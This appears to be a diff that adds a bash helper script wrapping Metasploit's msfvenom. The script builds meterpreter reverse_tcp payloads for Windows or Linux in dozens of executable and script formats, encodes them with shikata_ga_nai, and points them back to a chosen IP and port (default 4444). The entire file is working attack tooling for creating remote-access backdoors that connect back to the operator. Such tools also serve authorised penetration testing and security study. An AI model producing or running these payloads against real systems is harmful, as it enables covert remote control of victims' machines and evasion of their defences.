@@ -1,0 +1,66 @@
+#!/usr/bin/env bash
+
+default_ip() {
+    ip -o a | perl -lne 'if (/[^1]:.+inet ([^\/]+)/) {print $1; exit}'
+}
+
+usage() {
+    echo "Usage: ${0/*\//} [OPTIONS] <format> [payload options]"
+    echo
+    echo "Simplify generating a meterpreter payload"
+    echo
+    echo "Options:"
+    echo "    -h, --help         Display this help message"
+    echo "    -i, --ip=IP        Connect back to specified IP address"
+    echo "                       (default: $ip)"
+    echo "    -l, --linux        Create linux meterpreter"
+    echo "    -p, --port=PORT    Connect back to the specified port"
+    echo "                       (default: $port)"
+    echo "    -w, --windows      Create windows meterpreter (default"
+    echo "                       behavior)"
+    echo
+    echo "Executable formats:"
+    echo "    asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only,"
+    echo "    exe-service, exe-small, hta-psh, loop-vbs, macho, msi,"
+    echo "    msi-nouac, osx-app, psh, psh-net, psh-reflection,"
+    echo "    psh-cmd, vba, vba-exe, vba-psh, vbs, war"
+    echo
+    echo "Transform formats:"
+    echo "    bash, c, csharp, dw, dword, hex, java, js_be, js_le,"
+    echo "    num, perl, pl, powershell, ps1, py, python, raw, rb,"
+    echo "    ruby, sh, vbapplication, vbscript"
+    echo
+    exit $1
+}
+
+declare -a args
+
+ip="$(default_ip)"
+os="windows"
+port=4444
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        "--") shift && args+=("$@") && break ;;
+        "-h"|"--help") usage 0 ;;
+        "-i"|"--ip") shift; [[ $# -gt 0 ]] || usage 1
+            ip="$1"
+            ;;
+        "-l"|"--linux") os="linux/x86" ;;
+        "-p"|"--port") shift; [[ $# -gt 0 ]] || usage 1
+            port="$1"
+            ;;
+        "-w"|"--windows") os="windows" ;;
+        *) args+=("$1") ;;
+    esac
+    shift
+done
+[[ -z ${args[@]} ]] || set -- "${args[@]}"
+
+[[ $# -eq 1 ]] || usage 2
+
+format="$1" && shift
+
+msfvenom -b "\x00" -e x86/shikata_ga_nai -f $format \
+    -p $os/meterpreter/reverse_tcp LHOST=$ip LPORT=$port $@ \
+    >meterpreter.$format
